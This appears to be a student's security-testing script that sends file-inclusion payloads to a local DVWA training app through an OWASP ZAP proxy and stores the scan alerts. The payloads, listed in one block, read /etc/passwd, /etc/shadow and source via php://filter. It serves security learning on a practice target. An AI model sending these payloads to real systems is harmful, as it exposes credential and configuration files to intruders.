from zapv2 import ZAPv2
from db import alerts_col
from dotenv import load_dotenv
from datetime import datetime
import requests, time, os, urllib3

urllib3.disable_warnings()
load_dotenv()

API_KEY = os.getenv("ZAP_API_KEY")
ZAP_URL = os.getenv("ZAP_URL")
LFI_TARGET = "http://127.0.0.1/dvwa/vulnerabilities/fi/?page=include.php"

zap = ZAPv2(apikey=API_KEY, proxies={"http": ZAP_URL, "https": ZAP_URL})

def access_lfi_page():
    print("[*] Accessing File Inclusion page through ZAP proxy...")
    session = requests.Session()
    session.proxies = {"http": ZAP_URL, "https": ZAP_URL}
    session.verify = False

    session.post("http://127.0.0.1/dvwa/login.php", data={
        "username": "admin", "password": "password", "Login": "Login"
    })
    session.post("http://127.0.0.1/dvwa/security.php",
                 data={"security": "low", "seclev_submit": "Submit"})

    # LFI payloads
    lfi_payloads = [
        "include.php",
        "../../../../etc/passwd",
        "../../../../etc/hosts",
        "../../../../windows/win.ini",
        "../../../etc/shadow",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "http://127.0.0.1/dvwa/php.ini",
    ]

    print("[*] Sending LFI/RFI payloads...")
    for p in lfi_payloads:
        url = f"http://127.0.0.1/dvwa/vulnerabilities/fi/?page={p}"
        try:
            r = session.get(url, timeout=10)
            detected = "lfi_detected" if any(
                x in r.text for x in ["root:x:", "[extensions]", "localhost"]
            ) else "normal_response"
            print(f"    Payload: {p:50} | {r.status_code} | {detected}")
        except Exception as e:
            print(f"    Error: {e}")
        time.sleep(0.5)
    print("[+] LFI payloads sent — captured in ZAP")

def run_lfi_scan():
    print("\n[*] Running LFI/RFI active scan...")
    scan_id = zap.ascan.scan(LFI_TARGET, apikey=API_KEY)
    time.sleep(2)
    while int(zap.ascan.status(scan_id)) < 100:
        print(f"    LFI Scan: {zap.ascan.status(scan_id)}%")
        time.sleep(8)
    print("[+] LFI/RFI scan complete!")

    alerts = zap.core.alerts(
        baseurl="http://127.0.0.1/dvwa/vulnerabilities/fi")
    lfi = [a for a in alerts if any(x in a.get("name","").lower()
           for x in ["path traversal","file inclusion",
                     "directory traversal","lfi","rfi"])]

    print(f"\n[+] LFI/RFI alerts: {len(lfi)}")
    print(f"[+] Total alerts on page: {len(alerts)}")

    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    docs = [{
        "scan_id": f"lfi_{scan_id}",
        "scan_type": "targeted_lfi",
        "timestamp": ts,
        "name": a.get("name",""),
        "risk": a.get("risk",""),
        "confidence": a.get("confidence",""),
        "url": a.get("url",""),
        "param": a.get("param",""),
        "attack": a.get("attack",""),
        "description": a.get("description",""),
        "solution": a.get("solution",""),
    } for a in alerts]

    if docs:
        alerts_col.insert_many(docs)

    for a in alerts:
        print(f"  [{a.get('risk','?'):13}] {a.get('name','')}")

    print(f"\n[✓] {len(docs)} alerts saved (scan_type: targeted_lfi)")
    return docs

if __name__ == "__main__":
    access_lfi_page()
    run_lfi_scan()
    print("\n[✓] Day 7 LFI/RFI scan complete!")
